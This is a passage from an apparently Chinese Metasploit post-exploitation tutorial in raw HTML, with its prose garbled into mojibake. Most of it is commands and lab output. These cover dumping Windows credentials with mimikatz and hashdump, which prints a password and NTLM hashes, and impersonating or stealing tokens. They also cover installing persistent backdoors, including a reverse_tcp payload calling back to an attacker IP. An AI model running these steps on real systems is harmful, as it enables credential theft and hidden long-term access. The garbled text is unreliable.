SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) ï¿½İ¿ï¿½ </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>ä½¿ç”¨meterpreterçš„run hashdumpå‘½ä»¤</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>3.post/windows/gather/smart_hashdumpä»ä¸Šé¢ä¹Ÿå¯ä»¥çœ‹å‡ºå®˜æ–¹æ¨è<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>4.powerdump<br>åŒ hashdumpï¼Œä½†å¤±è´¥äº†<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-å‡å†’ä»¤ç‰Œ-4"><a href="#4-7-å‡å†’ä»¤ç‰Œ-4" class="headerlink" title="4.7 å‡å†’ä»¤ç‰Œ"></a>4.7 å‡å†’ä»¤ç‰Œ</h3>åœ¨ç”¨æˆ·ç™»å½•windowsæ“ä½œç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä»¤ç‰Œ(Token)ï¼Œå½“ç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºæ—¶éƒ½ä¼šä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒåŠŸèƒ½ç±»ä¼¼äºç½‘ç«™çš„sessionæˆ–è€…cookieã€‚msfæä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬å‡å†’åˆ«äººçš„ä»¤ç‰Œï¼Œå®ç°èº«ä»½åˆ‡æ¢ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯åŸŸç¯å¢ƒï¼Œåˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„ç»ˆç«¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡å†’æˆåŸŸç®¡ç†å‘˜çš„è§’è‰²ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognitoå‡å†’ä»¤ç‰Œ</span><br><span class="line">use incognito      #help incognito  æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">list_tokens -u    #æŸ¥çœ‹å¯ç”¨çš„token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #å‡å†’SYSTEM token</span><br><span class="line">æˆ–è€…impersonate_token NT\ AUTHORITY\\SYSTEM #ä¸åŠ å•å¼•å· éœ€ä½¿ç”¨\\</span><br><span class="line">execute -f cmd.exe -i â€“t    # -t ä½¿ç”¨å‡å†’çš„token æ‰§è¡Œ</span><br><span class="line">æˆ–è€…ç›´æ¥shell</span><br><span class="line">rev2self   #è¿”å›åŸå§‹token</span><br><span class="line"></span><br><span class="line"># 2.steal_tokençªƒå–ä»¤ç‰Œ</span><br><span class="line">steal_token &lt;pidå€¼&gt;   #ä»æŒ‡å®šè¿›ç¨‹ä¸­çªƒå–token   å…ˆps</span><br><span class="line">drop_token  #åˆ é™¤çªƒå–çš„token</span><br></pre></td></tr></table></figure><h3 id="4-8-æ¤å…¥åé—¨-4"><a href="#4-8-æ¤å…¥åé—¨-4" class="headerlink" title="4.8 æ¤å…¥åé—¨"></a>4.8 æ¤å…¥åé—¨</h3>Meterpreterä»…ä»…æ˜¯åœ¨å†…å­˜ä¸­é©»ç•™çš„Shellcodeï¼Œåªè¦ç›®æ ‡æœºå™¨é‡å¯å°±ä¼šä¸§å¤±æ§åˆ¶æƒï¼Œä¸‹é¢å°±ä»‹ç»å¦‚ä½•æ¤å…¥åé—¨ï¼Œç»´æŒæ§åˆ¶ã€‚1.persistenceå¯åŠ¨é¡¹åé—¨è·¯å¾„ï¼šmetasploit/scripts/meterpreter/persistenceåŸç†æ˜¯åœ¨<code>C:\Users***\AppData\Local\Temp\</code>ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬ï¼Œåœ¨æ³¨å†Œè¡¨<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ï¼Œ<strong>å¾ˆå®¹æ˜“è¢«æ€è½¯æ‹¦æˆªï¼Œå®˜æ–¹ä¸æ¨è</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence â€“h  #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-XæŒ‡å®šå¯åŠ¨çš„æ–¹å¼ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼Œ-iåå‘è¿æ¥çš„æ—¶é—´é—´éš”(5s) â€“r æŒ‡å®šæ”»å‡»è€…çš„ip</span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>èƒ½å®ç°åŒæ ·åŠŸèƒ½çš„è„šæœ¬è¿˜æœ‰ï¼šexploit/windows/local/persistence2.metsvcæœåŠ¡åé—¨åœ¨C:\Users<em><strong>\AppData\Local\Temp\ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬<br>åœ¨æ³¨å†Œè¡¨HKLM\Software\Microsoft\Windows\CurrentVersion\Run\åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ã€‚</strong>é€šè¿‡æœåŠ¡å¯åŠ¨ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå®˜æ–¹ä¸æ¨èä½¿ç”¨ï¼Œè¿è¡Œå¤±è´¥</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc â€“A   #è‡ªåŠ¨å®‰è£…åé—¨</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run metsvc â€“A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œä½†æœåŠ¡æ²¡æœ‰å¯åŠ¨èµ·æ¥ï¼Œå¤±è´¥äº†ã€‚ä½¿ç”¨<code>-r</code>å‚æ•°å¯å¸è½½æœåŠ¡ã€‚3.persistence_exeå†æ¥çœ‹çœ‹å®˜æ–¹æ¨èçš„ä¸œè¥¿å§<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>æ­¤æ¨¡å—å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸Šè½½åˆ°è¿œç¨‹ä¸»æœºå¹¶è¿›è¡Œåˆ›å»ºæŒä¹…æ€§ã€‚<br>æ¶‰åŠåˆ°å››ä¸ªå‚æ•°<ul><li>REXENAMEæ˜¯æ‹·è´åˆ°ç›®æ ‡ç³»ç»Ÿä¸­çš„åå­—</li><li>EXEPATHæ˜¯å°†è¦ä¸Šä¼ çš„åé—¨åœ¨æœ¬åœ°çš„ä½ç½®</li><li>SESSIONæ˜¯é€‰æ‹©è¿è¡Œæ­¤æ¨¡å—çš„ä¼šè¯</li><li>STARTUPæ˜¯å¯åŠ¨ç±»å‹ï¼Œæœ‰USERã€SYSTEMã€SERVICEè¿™ä¸‰ç§å–å€¼ï¼ŒUSERè¡¨ç¤ºä¸ºå°†åœ¨ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨ï¼ŒSYSTEMè¡¨ç¤ºå°†åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨(éœ€è¦æƒé™)ï¼ŒSERVICEè¡¨ç¤ºå°†åˆ›å»ºä¸€ä¸ªå¯åŠ¨æœåŠ¡é¡¹(éœ€è¦æƒé™)ã€‚</li></ul>å°è¯•ä¸€ä¸‹ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>4.registry_persistenceå®Œæ•´è·¯å¾„ä¸ºexploit/windows/local/registry_persistenceå’Œç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ï¼Œæ­¤æ¨¡å—å°†ä¼šå®‰è£…ä¸€ä¸ªpayloadåˆ°æ³¨å†Œè¡¨çš„å¯åŠ¨é¡¹ä¸­ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>åŒç±»å‹çš„è¿˜æœ‰å…¶ä»–payloadï¼Œå¦‚exploit/windows/local/vss_persistenceï¼Œexploit/windows/local/s4u_persistenceã€‚<h2 id="å‚è€ƒ-4"><a href="#å‚è€ƒ-4" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">è®¿é—®çš„æ–‡ç« å®¡æ ¸ä¸­â€¦ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a>## 1. å®‰è£…è¿è¡ŒåŠåˆå§‹åŒ–å®‰è£…<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># å®‰è£…å®Œæˆåä½ç½®</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># ç›®å½•ç»“æ„ </span><br><span class="line">--modules é‡ç‚¹çœ‹è¿™é‡Œå°±è¡Œäº†</span><br><span class="line">  --auxiliary ä¸»è¦åŒ…å«è¾…åŠ©æ€§è„šæœ¬(æ‰«æã€å—…æ¢ã€æ³¨å…¥ã€çˆ†ç ´ï¼Œæ¼æ´æŒ–æ˜)</span><br><span class="line">  --encoders ä¸»è¦åŒ…å«å„ç§ç¼–ç å·¥å…·ï¼Œä»¥ä¾¿ç»•è¿‡å…¥ä¾µæ£€æµ‹å’Œè¿‡æ»¤ç³»ç»Ÿ</span><br><span class="line">  --exploits æ¼æ´åˆ©ç”¨ï¼ŒåŒ…å«ä¸»æµçš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œexpå‘½åè§„åˆ™:ç³»ç»Ÿ/æœåŠ¡/æ¨¡å—</span><br><span class="line">  --nops ç»•è¿‡é’ˆå¯¹æº¢å‡ºæ”»å‡»æ»‘è¡Œå­—ç¬¦ä¸²çš„æ‹¦æˆªæ£€æµ‹</span><br><span class="line">  --payloads æ”»å‡»è·è½½ï¼Œä¸»è¦åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»£ç </span><br><span class="line">  --post æ­¤ç›®å½•æ”¾ç€msfçš„exploitæ‰§è¡ŒæˆåŠŸåï¼Œå‘ç›®æ ‡å‘é€çš„ä¸€äº›åŠŸèƒ½æ€§æŒ‡ä»¤ï¼Œå¦‚ææƒï¼Œè·å–hashç­‰</span><br><span class="line">  --evasion æ–°å¢ï¼Œç”¨æ¥ç”Ÿæˆå…æ€payloadï¼Œç±»ä¼¼äºé›†æˆmsfvenomåŠŸèƒ½</span><br><span class="line">--data æ”¾äº†meterpreter ï¼ŒpassiveXï¼Œvncï¼ŒDLLsï¼Œç­‰è¿™äº›å·¥å…·å’Œä¸€äº›ç”¨æˆ·æ¥å£ä»£ç ï¼Œmsfweb å’Œä¸€äº›å…¶ä»–æ¨¡å—ç”¨åˆ°çš„æ•°æ®æ–‡ä»¶</span><br><span class="line">--plugins è¿™é‡Œçš„æ¨¡å—ç”¨æˆ·éœ€è¦loadæ¥åŠ è½½ï¼Œæä¾›æ•°æ®åº“è¿æ¥æ’ä»¶å’Œå„ç§è¦ç”¨åˆ°çš„æ’ä»¶</span><br><span class="line">--scripts è¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å¤§éƒ½æ˜¯meterpreterè¿™ä¸ªæ¨¡å—åˆ©ç”¨çš„è„šæœ¬ï¼Œæ¯”å¦‚ç”¨åˆ°migrateæ¥è½¬ç§»åˆ°å…¶ä»–è¿›ç¨‹çš„æŒ‡ä»¤çš„æºä»£ç å°±åœ¨æ­¤</span><br><span class="line">--tools åŒ…å«ä¸€äº›æœ‰ç”¨çš„è„šæœ¬å’Œé›¶æ•£çš„å·¥å…·</span><br></pre></td></tr></table></figure>å¯åŠ¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># è¿è¡Œ</span><br><span class="line">$ 